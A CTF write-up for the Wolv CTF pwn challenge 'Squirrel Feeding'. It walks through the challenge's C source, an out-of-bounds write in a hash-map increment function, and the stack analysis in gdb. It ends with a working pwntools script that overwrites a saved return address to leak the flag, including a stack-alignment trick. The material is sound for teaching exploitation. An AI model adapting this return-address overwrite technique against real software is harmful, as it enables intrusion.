---
title: "Wolv CTF Squirrel Feeding"
tags: Pwn
style: border
color: info
comments: true
description: wolv ctf out-of-bounds abusement
---

# Squirrel Feeding

This is a recap from the recent Wolv CTF from UMich.
Squirrel Feeding was a bit puzzling challenge that requires you to find the OOB (out-of-bounds) vulnerability within the code, analyze structure layouts, and use a small trick to smoothly execute the exploit.

## Analysis

Let's look at the souce code:
```c
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define FEED_OPTION 1
#define VIEW_OPTION 2
#define QUIT_OPTION 3
#define MAX_NAME_LEN 16
#define BIN_COUNT 10
#define BIN_SIZE 4
#define FLAG_SQUIRREL_NAME "santa"

// Structs

typedef struct map_entry { // 24 bytes
    char name[MAX_NAME_LEN]; // 16 bytes
    size_t weight; // 8 bytes
} map_entry;

typedef struct map_data { // 1040 bytes
    size_t bin_sizes[BIN_COUNT]; // 80 bytes
    map_entry bins[BIN_COUNT][BIN_SIZE]; // 960 bytes
} map_data;

typedef struct map { // 1048 bytes
    map_data *data; // 8 bytes
    map_data local; // 1040 bytes
} map;

// Globals

map flag_map = {0};

// Functions

size_t hash_string(char *string) {
    size_t hash = 0;
    size_t len = strlen(string);
    if (len > MAX_NAME_LEN)
        return 0;

    for (size_t i = 0; i < len; i++) {
        hash += string[i] * 31;
    }
    return hash;
}

void get_max_weight(map *m, char *key) {
    // TODO: implement
    // I figured I would just leave the stub in!
}

void increment(map *m, char *key, size_t amount) {
    size_t hash = hash_string(key);
    if (hash == 0)
        return;

    size_t index = hash % BIN_COUNT;

    for (size_t i = 0; i <= BIN_COUNT; i++) {
        map_entry *entry = &m->data->bins[index][i];

        // Increment existing
        if (strncmp(entry->name, key, MAX_NAME_LEN) == 0) {
            entry->weight += amount;
            printf("Squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            return;
        }

        // Create new
        if (i == m->data->bin_sizes[index]) {
            strncpy(entry->name, key, MAX_NAME_LEN);
            entry->weight += amount;
            if (key != FLAG_SQUIRREL_NAME) printf("New squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            m->data->bin_sizes[index]++;
            // TODO: enforce that new weight does not exceed the "presidential chonk!"
            get_max_weight(&flag_map, FLAG_SQUIRREL_NAME);
            return;
        }
    }
}

void print(map *map, char *key) {
    size_t hash = hash_string(key);
    if (hash == 0)
        return;

    size_t index = hash % BIN_COUNT;

    for (size_t i = 0; i < map->data->bin_sizes[index]; i++) {
        map_entry *entry = &map->data->bins[index][i];

        if (strncmp(entry->name, key, MAX_NAME_LEN) != 0) continue;

        printf("Squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
        return;
    }
}

void init_flag_map() {
    FILE *flag_file = fopen("flag.txt", "r");
    if (flag_file == NULL) {
        puts("File not found!");
        exit(EXIT_FAILURE);
    }

    char flag_text[0x100];
    fgets(flag_text, sizeof(flag_text), flag_file);
    long flag_weight = strtol(flag_text, NULL, 10);

    flag_map.data = &flag_map.local;
    increment(&flag_map, FLAG_SQUIRREL_NAME, flag_weight);

    fclose(flag_file);
}

size_t i = 0;
long option = 0;
char *end_ptr = NULL;
char option_input[0x8] = {0};
char name_input[MAX_NAME_LEN] = {0};

void loop() {
    map m = {0};
    m.data = &m.local;

    while (i < 5) {
        puts("==============================");
        puts("What would you like to do?");
        puts("1. Feed your favorite squirrel");
        puts("2. View squirrel weight");
        puts("3. Quit");
        fputs("> ", stdout);

        fgets(option_input, sizeof(option_input), stdin);
        option = strtol(option_input, &end_ptr, 10);
        if (errno) {
            puts("Invalid option!");
            continue;
        }

        if (option == FEED_OPTION) {
            ++i;

            fputs("Enter their name: ", stdout);
            fgets(name_input, sizeof(name_input), stdin);

            fputs("Enter the amount to feed them: ", stdout);
            fgets(option_input, sizeof(option_input), stdin);
            option = strtol(option_input, &end_ptr, 10);
            if (errno) {
                puts("Invalid option!");
                continue;
            }

            increment(&m, name_input, option);

        } else if (option == VIEW_OPTION) {
            fputs("Enter their name: ", stdout);

            fgets(name_input, sizeof(name_input), stdin);

            print(&m, name_input);

        } else if (option == QUIT_OPTION) {
            break;

        } else {
            puts("Invalid option!");
        }
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    puts("Welcome to the Michigan squirrel feeding simulator!");

    init_flag_map();

    loop();
}
```
I added some comments (byte sizes of structs) to help understand the code and exploit later.

```hash_string``` calculates the hash value of given string by calculating the sum of each character multiplied by 31.

```print``` will print the contents of an entry of a map with the given key by calculating its hash.

```init_flag_map()``` initializes the ```map``` of the squirrel by reading contents from flag file and storing it using ```increment```.

And ```increment``` will take a map, key (name of squirrel), and amount (int). Then depending on whether the given key already exists, it will update the existing weight by adding the amount or will add a new entry in the next available bin. ```increment``` decides which index it will add the next entry by taking the modulus of the calculated hash.

Using the knowledge of the above functions, the codeflow is as follows:
- main calls init_flag_map and initialize flag_map
- main calls loop
- loop will take user input five times
- in each loop, depending on the option, loop will either feed squirrel(existing or creating new) or print info of a squirrel

## Vuln
The vulnerability of this program is out-of-bounds, which lies within function ```increment```.

Within the loop of increment, we see that the loop runs until BIN_COUNT rather than BIN_SIZE-1, allowing us to write to entries until index [BIN_SIZE].

## Planning
Now the struct layout analysis comes in. We can see that map has a pointer to map_data and a local map_data.

A map_data includes an array of bin size for each bin and the actual bin with map entries. The bin has 10 index and each index has 4 entries.

Finally, each entry consits of a name and weight.

We can abuse the OOB by accessing the address beyond the last map_entry of the last index, which will be at ```bins[9][4]```.

We can add entries by using increment, and make it access the last index everytime so we can add five entries to the last index. 

And to access the last index (9), we can take advantage of the hash_string method.
For example, by passing '1' as key, it will calculate to (49 * 31) % 10 = 9. To prevent overlap, we add '2' at the end of every increment so that the hash won't change: (49 * 31 + (50 * 31)*x) % 10 = 9, where x is the number of '2's we add.

### So what can we change?
By running GDB, we can see the original contents of where our new "entry" will be:
```bash
gdb-peda$ x/8gx 0x7fffffffdeb0+1048
0x7fffffffe2c8: 0x00005555555592a0      0x00007fffffffe2e0
0x7fffffffe2d8: 0x00005555555559c0      0x0000000000000001
0x7fffffffe2e8: 0x00007ffff7db3d90      0x0000000000000000
0x7fffffffe2f8: 0x000055555555593e      0x00000001ffffe3e0
```

Here, ```0x7fffffffe2c8``` is where name goes and ```0x7fffffffe2d8``` is where weight goes.

Our current "weight" is *main+130, we can change this by adding or subtracting offset on this address to point towards our new return address.

The new return address should be ```print+4```.
If we look at increment again:
```c
        if (i == m->data->bin_sizes[index]) {
            strncpy(entry->name, key, MAX_NAME_LEN);
            entry->weight += amount;
            if (key != FLAG_SQUIRREL_NAME) printf("New squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            m->data->bin_sizes[index]++;
            // TODO: enforce that new weight does not exceed the "presidential chonk!"
            get_max_weight(&flag_map, FLAG_SQUIRREL_NAME);
            return;
        }
```
It calls ```get_max_weight```, which does nothing, but this will set the arguments (rdi, rsi) to &flag_map and FLAG_SQUIRREL_NAME.
We can pass these arguments directly to ```print``` since they do not change until loop returns to main->print.

The offset from *main+130 to *print+4 turns out to be -0x4ae.

## Exploit
We simply need to add 4 buffer entries and pass on the final malicious entry at the end, which could look like:
```python
#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./challenge')
# p=remote("squirrel-feeding.wolvctf.io",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)


for i in range(4):
    sla("> ", "1")
    sla(": ", "1"+"2"*i) # (49 + 50*i) % 10 = 9
    sla(": ", "1")

# gdb.attach(p)

sla("> ", "1")
sla(": ", "1"+"2222")
sla(": ", "-1197") # 0x4ae-1


p.interactive()
```

### Why not -1198(0x4ae)?
If we use -1198, we receive SIGSEGV error here:
```bash
=> 0x7fc1dae94693 <buffered_vfprintf+115>:      movaps XMMWORD PTR [rsp+0x40],xmm0
```
This is caused by misalignment of stack, so by shifting the return address by one (this is the little trick!), i.e. change the offset from -1198 to -1197, the new return address will be *print+5 and the exploit will work smoothly.

Thank you,

079
